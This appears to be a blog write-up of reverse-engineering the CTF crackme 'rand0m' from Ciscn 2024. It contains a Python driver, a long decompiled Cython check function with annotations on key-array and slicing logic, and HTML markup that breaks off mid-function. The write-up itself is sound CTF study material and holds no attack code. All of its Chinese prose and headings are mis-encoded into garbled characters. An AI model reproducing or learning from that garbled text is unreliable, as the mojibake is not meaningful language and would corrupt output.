<p>å…¶ä¸­å¤§éƒ¨åˆ†ä»£ç éƒ½åœ¨å¯¹å–åˆ°çš„<code>x</code>çš„é•¿åº¦åšå¯¹åº”å¤„ç† å®é™…ä¸Šçœ‹åˆ°è¿™ç§ç»“æ„éƒ½è¦çŸ¥é“è¿›è¡Œçš„éƒ½æ˜¯åŒä¸€ç§è¿ç®— åªç”¨é€‰æ‹©ä¸€ç§æ¯”è¾ƒå¥½ç†è§£çš„æ¥åˆ¤æ–­æ˜¯ä»€ä¹ˆè¿ç®—å°±è¡Œ</p>
<h3 id="å®æˆ˜"><a href="#å®æˆ˜" class="headerlink" title="å®æˆ˜"></a>å®æˆ˜</h3><h4 id="Ciscn-C-C-B-2024-rand0m"><a href="#Ciscn-C-C-B-2024-rand0m" class="headerlink" title="[Ciscn &amp; C!C!B!2024] rand0m"></a>[Ciscn &amp; C!C!B!2024] rand0m</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> rand0m</span><br><span class="line"><span class="built_in">help</span>(rand0m)</span><br><span class="line">flag = <span class="built_in">input</span>(<span class="string">&quot;Please input: &quot;</span>)</span><br><span class="line"><span class="keyword">if</span>(rand0m.check(flag)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Congrats! Flag is: flag&#123;&quot;</span>+flag+<span class="string">&quot;&#125;&quot;</span>) </span><br><span class="line"><span class="keyword">else</span>: <span class="built_in">print</span>(<span class="string">&quot;Wrong! Try again!&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>è°ƒç”¨äº†<code>rand0m.pyd</code>ä¸­çš„<code>check</code>å‡½æ•° å®šä½å®Œå¸¸é‡æ„é€ å‡½æ•°åæŸ¥æ‰¾<code>rand0m.check</code>å­—ç¬¦ä¸² äº¤å‰å¼•ç”¨å‘ç°æœ‰ä¸¤å¤„ç”¨åˆ°:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F12%2F23%2F20241223-182920.png" alt="image-20241223182920772"></p>
<p>å…¶ä¸­ä¸€å¤„æœ‰æŠ¥é”™ä¿¡æ¯ å¾ˆæ˜æ˜¾å°±æ˜¯<code>check</code>å‡½æ•°çš„wrapper:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F12%2F23%2F20241223-183029.png" alt="image-20241223183029637"> </p>
<p>è·³åˆ°ç¬¬äºŒå¤„å°±æ˜¯checkå‡½æ•°çš„ä½ç½® å®é™…åˆ†ææ²¡ä»€ä¹ˆæ–°ä¸œè¥¿ éœ€è¦æ³¨æ„çš„åªæœ‰å¿½ç•¥æ‰ä¸€äº›éç”¨æˆ·çš„å¤„ç† ç›´æ¥ç»™å‡ºåˆ†æç»“æœ:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Py_obj *__fastcall <span class="title function_">rand0m_check</span><span class="params">(Py_obj *a1, Py_obj *usr_input)</span></span><br><span class="line">&#123;</span><br><span class="line">  Py_obj *v2; <span class="comment">// r12</span></span><br><span class="line">  Py_obj *v3; <span class="comment">// rbx</span></span><br><span class="line">  Py_obj *v4; <span class="comment">// rsi</span></span><br><span class="line">  Py_obj *v5; <span class="comment">// r14</span></span><br><span class="line">  Py_obj *arr1; <span class="comment">// r8</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v7; <span class="comment">// ebp</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v8; <span class="comment">// r13d</span></span><br><span class="line">  Py_obj **v9; <span class="comment">// rdx</span></span><br><span class="line">  Py_obj *v10; <span class="comment">// rcx</span></span><br><span class="line">  Py_obj *v11; <span class="comment">// rcx</span></span><br><span class="line">  Py_obj *v12; <span class="comment">// rcx</span></span><br><span class="line">  Py_obj *v13; <span class="comment">// rcx</span></span><br><span class="line">  Py_obj *v14; <span class="comment">// rcx</span></span><br><span class="line">  Py_obj *v15; <span class="comment">// rcx</span></span><br><span class="line">  Py_obj *v16; <span class="comment">// rcx</span></span><br><span class="line">  Py_obj *v17; <span class="comment">// rcx</span></span><br><span class="line">  Py_obj *v18; <span class="comment">// rcx</span></span><br><span class="line">  Py_obj *v19; <span class="comment">// r13</span></span><br><span class="line">  <span class="type">int</span> c4; <span class="comment">// eax</span></span><br><span class="line">  Py_obj *v21; <span class="comment">// rcx</span></span><br><span class="line">  Py_obj *i; <span class="comment">// r15</span></span><br><span class="line">  <span class="type">bool</span> v23; <span class="comment">// zf</span></span><br><span class="line">  Py_obj **v24; <span class="comment">// rdx</span></span><br><span class="line">  Py_obj *type; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 size; <span class="comment">// rcx</span></span><br><span class="line">  Py_obj *i8; <span class="comment">// rbp</span></span><br><span class="line">  Py_obj *k; <span class="comment">// r14</span></span><br><span class="line">  Py_obj *v29; <span class="comment">// rax</span></span><br><span class="line">  Py_obj *j_; <span class="comment">// rax</span></span><br><span class="line">  Py_obj *j_slice; <span class="comment">// rbx</span></span><br><span class="line">  Py_obj *v32; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v33; <span class="comment">// rcx</span></span><br><span class="line">  Py_obj *j8; <span class="comment">// rsi</span></span><br><span class="line">  Py_obj *midd; <span class="comment">// rdi</span></span><br><span class="line">  Py_obj *v36; <span class="comment">// rax</span></span><br><span class="line">  Py_obj *usr_in; <span class="comment">// r8</span></span><br><span class="line">  __int64 v38; <span class="comment">// rbx</span></span><br><span class="line">  Py_obj *slicer; <span class="comment">// rax</span></span><br><span class="line">  Py_obj *v40; <span class="comment">// r12</span></span><br><span class="line">  Py_obj *v41; <span class="comment">// rcx</span></span><br><span class="line">  Py_obj *string_rand0m; <span class="comment">// rdi</span></span><br><span class="line">  Py_obj *Item_KnownHash; <span class="comment">// rax</span></span><br><span class="line">  Py_obj *v44; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">int</span> v45; <span class="comment">// eax</span></span><br><span class="line">  _DWORD *item; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">int</span> v47; <span class="comment">// edx</span></span><br><span class="line">  Py_obj *res; <span class="comment">// rbx</span></span><br><span class="line">  Py_obj *v49; <span class="comment">// rcx</span></span><br><span class="line">  Py_obj *v50; <span class="comment">// r12</span></span><br><span class="line">  Py_obj *v51; <span class="comment">// rcx</span></span><br><span class="line">  Py_obj *v52; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v53; <span class="comment">// rcx</span></span><br><span class="line">  Py_obj *i2; <span class="comment">// rsi</span></span><br><span class="line">  Py_obj *v55; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> IsTrue; <span class="comment">// ebx</span></span><br><span class="line">  Py_obj *v57; <span class="comment">// rcx</span></span><br><span class="line">  Py_obj **v58; <span class="comment">// rdx</span></span><br><span class="line">  Py_obj *v59; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v60; <span class="comment">// rcx</span></span><br><span class="line">  Py_obj *v61; <span class="comment">// rsi</span></span><br><span class="line">  Py_obj *v62; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> IsTrue_; <span class="comment">// esi</span></span><br><span class="line">  Py_obj *v64; <span class="comment">// rax</span></span><br><span class="line">  Py_obj *v65; <span class="comment">// rcx</span></span><br><span class="line">  Py_obj *v66; <span class="comment">// rdx</span></span><br><span class="line">  Py_obj *v67; <span class="comment">// rbx</span></span><br><span class="line">  Py_obj *v68; <span class="comment">// rax</span></span><br><span class="line">  Py_obj *v69; <span class="comment">// rcx</span></span><br><span class="line">  Py_obj *key; <span class="comment">// [rsp+30h] [rbp-88h]</span></span><br><span class="line">  Py_obj *v72; <span class="comment">// [rsp+38h] [rbp-80h]</span></span><br><span class="line">  _QWORD v73[<span class="number">2</span>]; <span class="comment">// [rsp+50h] [rbp-68h] BYREF</span></span><br><span class="line">  <span class="type">int</span> tmp1; <span class="comment">// [rsp+C0h] [rbp+8h]</span></span><br><span class="line">  Py_obj *v76; <span class="comment">// [rsp+D0h] [rbp+18h]</span></span><br><span class="line">  Py_obj *v77; <span class="comment">// [rsp+D8h] [rbp+20h]</span></span><br><span class="line"></span><br><span class="line">  v2 = usr_input;</span><br><span class="line">  v3 = <span class="number">0LL</span>;</span><br><span class="line">  v4 = <span class="number">0LL</span>;</span><br><span class="line">  v5 = <span class="number">0LL</span>;</span><br><span class="line">  key = <span class="number">0LL</span>;</span><br><span class="line">  v76 = <span class="number">0LL</span>;</span><br><span class="line">  v72 = <span class="number">0LL</span>;</span><br><span class="line">  arr1 = PyList_New(<span class="number">8LL</span>);                       <span class="comment">// arr1 = [None] * 8</span></span><br><span class="line">  <span class="keyword">if</span> ( !arr1 )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = <span class="number">13</span>;</span><br><span class="line">    v8 = <span class="number">2861</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_225;</span><br><span class="line">  &#125;</span><br><span class="line">  v9 = table;</span><br><span class="line">  v10 = table[<span class="number">40</span>];</span><br><span class="line">  <span class="keyword">if</span> ( LODWORD(v10-&gt;refcnt) != <span class="number">-1</span> )</span><br><span class="line">    ++LODWORD(v10-&gt;refcnt);</span><br><span class="line">  *(_QWORD *)arr1-&gt;item = v9[<span class="number">40</span>];</span><br><span class="line">  v11 = v9[<span class="number">43</span>];</span><br><span class="line">  <span class="keyword">if</span> ( LODWORD(v11-&gt;refcnt) != <span class="number">-1</span> )</span><br><span class="line">    ++LODWORD(v11-&gt;refcnt);</span><br><span class="line">  *(_QWORD *)(arr1-&gt;item + <span class="number">8LL</span>) = v9[<span class="number">43</span>];</span><br><span class="line">  v12 = v9[<span class="number">41</span>];</span><br><span class="line">  <span class="keyword">if</span> ( LODWORD(v12-&gt;refcnt) != <span class="number">-1</span> )</span><br><span class="line">    ++LODWORD(v12-&gt;refcnt);</span><br><span class="line">  *(_QWORD *)(arr1-&gt;item + <span class="number">16LL</span>) = v9[<span class="number">41</span>];</span><br><span class="line">  v13 = v9[<span class="number">47</span>];</span><br><span class="line">  <span class="keyword">if</span> ( LODWORD(v13-&gt;refcnt) != <span class="number">-1</span> )</span><br><span class="line">    ++LODWORD(v13-&gt;refcnt);</span><br><span class="line">  *(_QWORD *)(arr1-&gt;item + <span class="number">24LL</span>) = v9[<span class="number">47</span>];</span><br><span class="line">  v14 = v9[<span class="number">39</span>];</span><br><span class="line">  <span class="keyword">if</span> ( LODWORD(v14-&gt;refcnt) != <span class="number">-1</span> )</span><br><span class="line">    ++LODWORD(v14-&gt;refcnt);</span><br><span class="line">  *(_QWORD *)(arr1-&gt;item + <span class="number">32LL</span>) = v9[<span class="number">39</span>];</span><br><span class="line">  v15 = v9[<span class="number">45</span>];</span><br><span class="line">  <span class="keyword">if</span> ( LODWORD(v15-&gt;refcnt) != <span class="number">-1</span> )</span><br><span class="line">    ++LODWORD(v15-&gt;refcnt);</span><br><span class="line">  *(_QWORD *)(arr1-&gt;item + <span class="number">40LL</span>) = v9[<span class="number">45</span>];</span><br><span class="line">  v16 = v9[<span class="number">42</span>];</span><br><span class="line">  <span class="keyword">if</span> ( LODWORD(v16-&gt;refcnt) != <span class="number">-1</span> )</span><br><span class="line">    ++LODWORD(v16-&gt;refcnt);</span><br><span class="line">  *(_QWORD *)(arr1-&gt;item + <span class="number">48LL</span>) = v9[<span class="number">42</span>];</span><br><span class="line">  v17 = v9[<span class="number">46</span>];</span><br><span class="line">  <span class="keyword">if</span> ( LODWORD(v17-&gt;refcnt) != <span class="number">-1</span> )</span><br><span class="line">    ++LODWORD(v17-&gt;refcnt);</span><br><span class="line">  key = arr1;</span><br><span class="line">  *(_QWORD *)(arr1-&gt;item + <span class="number">56LL</span>) = v9[<span class="number">46</span>];</span><br><span class="line">  v18 = v9[<span class="number">29</span>];</span><br><span class="line">  <span class="keyword">if</span> ( LODWORD(v18-&gt;refcnt) != <span class="number">-1</span> )</span><br><span class="line">    ++LODWORD(v18-&gt;refcnt);</span><br><span class="line">  v19 = v9[<span class="number">29</span>];                                 <span class="comment">// arr1 = [0x112287f38, 0x218d24b3a, 0x10a30f74d, 0x320f1db77, 0x1023a1268, 0x22df38403, 0x208108807, 0x318499bb6]</span></span><br><span class="line">  c4 = <span class="number">0</span>;</span><br><span class="line">  v77 = v19;</span><br><span class="line">  tmp1 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    i = PyLong_FromLong((<span class="type">unsigned</span> <span class="type">int</span>)c4);      <span class="comment">// for i in range(4):</span></span><br><span class="line">    <span class="keyword">if</span> ( !i )</span><br><span class="line">    &#123;</span><br><span class="line">      v7 = <span class="number">15</span>;</span><br><span class="line">      v8 = <span class="number">2908</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_223;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( SLODWORD(v4-&gt;refcnt) &gt;= <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v23 = v4-&gt;refcnt-- == <span class="number">1LL</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v23 )</span><br><span class="line">          Py_Dealloc(v4);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    v24 = table;</span><br><span class="line">    type = (Py_obj *)i-&gt;type;</span><br><span class="line">    <span class="keyword">if</span> ( type == PyLong_Type )</span><br><span class="line">    &#123;</span><br><span class="line">      size = i-&gt;size;</span><br><span class="line">      <span class="keyword">if</span> ( (size &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( LODWORD(i-&gt;refcnt) != <span class="number">-1</span> )</span><br><span class="line">          ++LODWORD(i-&gt;refcnt);</span><br><span class="line">        i8 = i;</span><br><span class="line">        k = i;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_40;</span><br><span class="line">      &#125;</span><br><span class="line">      v29 = size &gt;= <span class="number">0x10</span></span><br><span class="line">          ? (Py_obj *)(*(__int64 (__fastcall **)(Py_obj *, Py_obj *))(*((_QWORD *)&amp;PyLong_Type + <span class="number">12</span>) + <span class="number">16LL</span>))(</span><br><span class="line">                        i,</span><br><span class="line">                        table[<span class="number">34</span>])</span><br><span class="line">          : PyLong_FromLongLong((Py_obj *)(<span class="number">8LL</span> * (<span class="type">int</span>)(LODWORD(i-&gt;item) * (<span class="number">1</span> - (size &amp; <span class="number">3</span>)))));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v29 = type == (Py_obj *)PyFloat_Type ? PyFloat_FromDouble(v21) : PyNumber_Multiply(i, table[<span class="number">34</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    i8 = v29;                                   <span class="comment">// i8 = i * 8</span></span><br><span class="line">    k = v29;</span><br><span class="line">    <span class="keyword">if</span> ( !v29 )</span><br><span class="line">    &#123;</span><br><span class="line">      v7 = <span class="number">16</span>;</span><br><span class="line">      v8 = <span class="number">2920</span>;</span><br><span class="line">      v4 = i;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_223;</span><br><span class="line">    &#125;</span><br><span class="line">    v24 = table;</span><br><span class="line">LABEL_40:</span><br><span class="line">    j_ = Add(i, v24[<span class="number">30</span>]);</span><br><span class="line">    j_slice = j_;                               <span class="comment">// j = i + 1</span></span><br><span class="line">    <span class="keyword">if</span> ( !j_ )</span><br><span class="line">    &#123;</span><br><span class="line">      v8 = <span class="number">2922</span>;</span><br><span class="line">      midd = <span class="number">0LL</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_208;</span><br><span class="line">    &#125;</span><br><span class="line">    v32 = (Py_obj *)j_-&gt;type;</span><br><span class="line">    <span class="keyword">if</span> ( v32 == PyLong_Type )</span><br><span class="line">    &#123;</span><br><span class="line">      v33 = j_slice-&gt;size;</span><br><span class="line">      <span class="keyword">if</span> ( (v33 &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( LODWORD(j_slice-&gt;refcnt) != <span class="number">-1</span> )</span><br><span class="line">          ++LODWORD(j_slice-&gt;refcnt);</span><br><span class="line">        j8 = j_slice;</span><br><span class="line">        midd = j_slice;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_53;</span><br><span class="line">      &#125;</span><br><span class="line">      v36 = v33 &gt;= <span class="number">0x10</span></span><br><span class="line">          ? (Py_obj *)(*(__int64 (__fastcall **)(Py_obj *, Py_obj *))(*((_QWORD *)&amp;PyLong_Type + <span class="number">12</span>) + <span class="number">16LL</span>))(</span><br><span class="line">                        j_slice,</span><br><span class="line">                        table[<span class="number">34</span>])</span><br><span class="line">          : PyLong_FromLongLong((Py_obj *)(<span class="number">8LL</span> * (<span class="type">int</span>)(LODWORD(j_slice-&gt;item) * (<span class="number">1</span> - (v33 &amp; <span class="number">3</span>)))));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v36 = v32 == (Py_obj *)PyFloat_Type ? PyFloat_FromDouble((Py_obj *)table) : PyNumber_Multiply(j_slice, table[<span class="number">34</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    j8 = v36;                                   <span class="comment">// j8 = j * 8</span></span><br><span class="line">    midd = v36;</span><br><span class="line">    <span class="keyword">if</span> ( !v36 )</span><br><span class="line">    &#123;</span><br><span class="line">      v8 = <span class="number">2924</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_208;</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_53:</span><br><span class="line">    <span class="keyword">if</span> ( SLODWORD(j_slice-&gt;refcnt) &gt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v23 = j_slice-&gt;refcnt-- == <span class="number">1LL</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v23 )</span><br><span class="line">        Py_Dealloc(j_slice);</span><br><span class="line">    &#125;</span><br><span class="line">    usr_in = (Py_obj *)v2-&gt;type;</span><br><span class="line">    v38 = usr_in[<span class="number">3</span>].size;</span><br><span class="line">    <span class="keyword">if</span> ( !v38 || !*(_QWORD *)(v38 + <span class="number">8</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      PyErr_Format(PyExc_TypeError, <span class="string">&quot;&#x27;%.200s&#x27; object is unsliceable&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)usr_in-&gt;item);</span><br><span class="line">LABEL_204:</span><br><span class="line">      j_slice = <span class="number">0LL</span>;</span><br><span class="line">LABEL_205:</span><br><span class="line">      v8 = <span class="number">2927</span>;</span><br><span class="line">LABEL_208:</span><br><span class="line">      v7 = <span class="number">16</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_209;</span><br><span class="line">    &#125;</span><br><span class="line">    slicer = PySlice_New(i8, j8, Py_NoneStruct);<span class="comment">// åˆ‡ç‰‡</span></span><br><span class="line">    v40 = slicer;</span><br><span class="line">    <span class="keyword">if</span> ( !slicer )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_204;</span><br><span class="line">    j_slice = (Py_obj *)(*(__int64 (__fastcall **)(Py_obj *, Py_obj *))(v38 + <span class="number">8</span>))(usr_input, slicer);<span class="comment">// slice = usr_input[i8:j8]</span></span><br><span class="line">    <span class="keyword">if</span> ( SLODWORD(v40-&gt;refcnt) &gt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v23 = v40-&gt;refcnt-- == <span class="number">1LL</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v23 )</span><br><span class="line">        Py_Dealloc(v40);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !j_slice )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_205;</span><br><span class="line">    <span class="keyword">if</span> ( SLODWORD(i8-&gt;refcnt) &gt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v23 = i8-&gt;refcnt-- == <span class="number">1LL</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v23 )</span><br><span class="line">        Py_Dealloc(i8);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( SLODWORD(j8-&gt;refcnt) &gt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v23 = j8-&gt;refcnt-- == <span class="number">1LL</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v23 )</span><br><span class="line">        Py_Dealloc(j8);</span><br><span class="line">    &#125;</span><br><span class="line">    v41 = v76;</span><br><span class="line">    v76 = j_slice;</span><br><span class="line">    <span class="keyword">if</span> ( v41 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( SLODWORD(v41-&gt;refcnt) &gt;= <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v23 = v41-&gt;refcnt-- == <span class="number">1LL</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v23 )</span><br><span class="line">          Py_Dealloc(v41);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    string_rand0m = table[<span class="number">19</span>];</span><br><span class="line">    Item_KnownHash = (Py_obj *)PyDict_GetItem_KnownHash(*table, string_rand0m, string_rand0m-&gt;item);</span><br><span class="line">    v44 = Item_KnownHash;</span><br><span class="line">    <span class="keyword">if</span> ( Item_KnownHash )</span><br><span class="line">    &#123;</span><br><span class="line">      v45 = LODWORD(Item_KnownHash-&gt;refcnt) + <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v45 )</span><br><span class="line">        LODWORD(v44-&gt;refcnt) = v45;</span><br><span class="line">      midd = v44;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( PyErr_Occurred() || (midd = (Py_obj *)sub_7FFDD0C83D40(string_rand0m), (v44 = midd) == <span class="number">0LL</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v7 = <span class="number">17</span>;</span><br><span class="line">      v8 = <span class="number">2941</span>;</span><br><span class="line">      v4 = i;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_223;</span><br><span class="line">    &#125;</span><br><span class="line">    item = <span class="number">0LL</span>;</span><br><span class="line">    v47 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v44-&gt;type == (_QWORD *)PyMethod_Type )</span><br><span class="line">    &#123;</span><br><span class="line">      item = (_DWORD *)v44-&gt;item;</span><br><span class="line">      <span class="keyword">if</span> ( item )</span><br><span class="line">      &#123;</span><br><span class="line">        midd = (Py_obj *)v44-&gt;size;</span><br><span class="line">        <span class="keyword">if</span> ( *item != <span class="number">-1</span> )</span><br><span class="line">          ++*item;</span><br><span class="line">        <span class="keyword">if</span> ( LODWORD(midd-&gt;refcnt) != <span class="number">-1</span> )</span><br><span class="line">          ++LODWORD(midd-&gt;refcnt);</span><br><span class="line">        <span class="keyword">if</span> ( SLODWORD(v44-&gt;refcnt) &gt;= <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v23 = v44-&gt;refcnt-- == <span class="number">1LL</span>;</span><br><span class="line">          <span class="keyword">if</span> ( v23 )</span><br><span class="line">            Py_Dealloc(v44);</span><br><span class="line">        &#125;</span><br><span class="line">        v47 = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    v73[<span class="number">0</span>] = j_slice;</span><br><span class="line">    res = call_rand0m((__int64)midd, &amp;v73[-v47], (<span class="type">unsigned</span> <span class="type">int</span>)(v47 + <span class="number">1</span>));<span class="comment">// res = rand0m(slice)</span></span><br><span class="line">    <span class="keyword">if</span> ( item )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">int</span>)*item &gt;= <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v23 = (*(_QWORD *)item)-- == <span class="number">1LL</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v23 )</span><br><span class="line">          Py_Dealloc(item);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !res )</span><br><span class="line">    &#123;</span><br><span class="line">      v7 = <span class="number">17</span>;</span><br><span class="line">      v8 = <span class="number">2961</span>;</span><br><span class="line">      v4 = i;</span><br><span class="line">LABEL_216:</span><br><span class="line">      v5 = v76;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_217;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( SLODWORD(midd-&gt;refcnt) &gt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v23 = midd-&gt;refcnt-- == <span class="number">1LL</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v23 )</span><br><span class="line">        Py_Dealloc(midd);</span><br><span class="line">    &#125;</span><br><span class="line">    v49 = v72;</span><br><span class="line">    v50 = res;</span><br><span class="line">    v72 = res;</span><br><span class="line">    <span class="keyword">if</span> ( v49 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( SLODWORD(v49-&gt;refcnt) &gt;= <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v23 = v49-&gt;refcnt-- == <span class="number">1LL</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v23 )</span><br><span class="line">          Py_Dealloc(v49);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    j_slice = Get_Item(res, <span class="number">1LL</span>);               <span class="comment">// r2 = res[1]</span></span><br><span class="line">    <span class="keyword">if</span> ( !j_slice )</span><br><span class="line">    &#123;</span><br><span class="line">      v7 = <span class="number">18</span>;</span><br><span class="line">      v8 = <span class="number">2975</span>;</span><br><span class="line">      v4 = i;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_223;</span><br><span class="line">    &#125;</span><br><span class="line">    v52 = (Py_obj *)i-&gt;type;</span><br><span class="line">    <span class="keyword">if</span> ( v52 == PyLong_Type )</span><br><span class="line">    &#123;</span><br><span class="line">      v53 = i-&gt;size;</span><br><span class="line">      <span class="keyword">if</span> ( (v53 &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( LODWORD(i-&gt;refcnt) != <span class="number">-1</span> )</span><br><span class="line">          ++LODWORD(i-&gt;refcnt);</span><br><span class="line">        i2 = i;</span><br><span class="line">        midd = i;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_114;</span><br><span class="line">      &#125;</span><br><span class="line">      v55 = v53 &gt;= <span class="number">0x10</span></span><br><span class="line">          ? (Py_obj *)(*(__int64 (__fastcall **)(Py_obj *, Py_obj *))(*((_QWORD *)&amp;PyLong_Type + <span class="number">12</span>) + <span class="number">16LL</span>))(</span><br><span class="line">                        i,</span><br><span class="line">                        table[<span class="number">31</span>])</span><br><span class="line">          : PyLong_FromLongLong((Py_obj *)(<span class="number">2LL</span> * (<span class="type">int</span>)(LODWORD(i-&gt;item) * (<span class="number">1</span> - (v53 &amp; <span class="number">3</span>)))));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v55 = v52 == (Py_obj *)PyFloat_Type ? PyFloat_FromDouble(v51) : PyNumber_Multiply(i, table[<span class="number">31</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    i2 = v55;                                   <span class="comment">// i2 = 2 * i</span></span><br><span class="line">    midd = v55;</span><br><span class="line">    <span class="keyword">if</span> ( !v55 )</span><br><span class="line">    &#123;</span><br><span class="line">      v7 = <span class="number">18</span>;</span><br><span class="line">      v8 = <span class="number">2977</span>;</span><br><span class="line">      v4 = i;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_213;</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_114:</span><br><span class="line">    k = Get_Item_list(key, i2);                 <span class="comment">// k = key[i * 2]</span></span><br><span class="line">    <span class="keyword">if</span> ( !k )</span><br><span class="line">    &#123;</span><br><span class="line">      v7 = <span class="number">18</span>;</span><br><span class="line">      v8 = <span class="number">2979</span>;</span><br><span class="line">      v4 = i;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_213;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( SLODWORD(i2-&gt;refcnt) &gt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v23 = i2-&gt;refcnt-- == <span class="number">1LL</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v23 )</span><br><span class="line">        Py_Dealloc(i2);</span><br><span class="line">    &#125;</span><br><span class="line">    midd = PyObject_RichCompare(j_slice, k, <span class="number">2LL</span>);<span class="comment">// if r2 == k:</span></span><br><span class="line">    <span class="keyword">if</span> ( !midd )</span><br><span class="line">    &#123;</span><br><span class="line">      v7 = <span class="number">18</span>;</span><br><span class="line">      v8 = <span class="number">2982</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_209;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( SLODWORD(j_slice-&gt;refcnt) &gt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v23 = j_slice-&gt;refcnt-- == <span class="number">1LL</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v23 )</span><br><span class="line">        Py_Dealloc(j_slice);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( SLODWORD(k-&gt;refcnt) &gt;= <span class="number">0</span> )</span><br><span 